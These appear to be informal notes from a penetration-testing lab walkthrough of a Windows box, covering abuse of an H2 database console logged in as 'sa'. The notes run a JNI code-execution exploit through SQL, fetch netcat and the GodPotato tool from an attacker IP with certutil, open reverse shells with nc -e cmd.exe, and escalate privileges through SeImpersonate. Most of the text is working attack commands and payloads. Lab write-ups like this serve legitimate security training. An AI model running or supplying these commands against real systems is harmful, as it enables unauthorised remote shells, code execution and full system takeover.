nmap showed ports 80 web, 135 rpc, 139 smb, 445 smb, 8082 web
port 80 want much
port 8082 had a H2 login portal, with username "sa" already there
With a random password, it logged me in, and allowed me to run sql commands
A couple of exploit did not work for me

HINT TAKEN: `SELECT FILE_READ(‘C:\Windows\System32\drivers\etc\hosts’, NULL);`
which, dint work for me, for some reason, but worked for another guy in a walkthrough

looking at the poc at https://www.exploit-db.com/exploits/49384
it is JNI code execution, basically java code

we realize we need to run some stuff before that
```sql
--write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', ......a bunch of chars....
'ISO-8859-1', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";

CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
-- gives jacko/tony
```

Now, we need to change the whoami command to wget, send over nc.exe then execute it
```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("wget http://192.168.45.247/nc64.exe -O \programdata\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```
we get a cannot run wget error
so we switch to certutil urlcache
```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.247/nc64.exe \\programdata\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("\\programdata\\nc.exe -nv 192.168.45.247 1234 -e powershell.exe").getInputStream()).useDelimiter("\\Z").next()');
--doesnt work
--instead, we do -e cmd, and it works
```

we find we cannot do whoami command, AT ALL!
neither was certutil
some stupid shiz

NOTE - A later walkthrough shows us we need to ==update the PATH variable== like so
`set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`
Then, we woulda been able to run any cmd

Since we were able to do it from sql, we try it again, with whoami /all
```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami /all").getInputStream()).useDelimiter("\\Z").next()');

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.247/GodPotato-NET4.exe \\programdata\\gp.exe").getInputStream()).useDelimiter("\\Z").next()');
```

we see we have seImpersonate, as all webpage users must!
send over godpotato, let the god do the work!

`.\gp.exe -cmd "C:\programdata\nc.exe -nv 192.168.45.247 9001 -e cmd.exe"`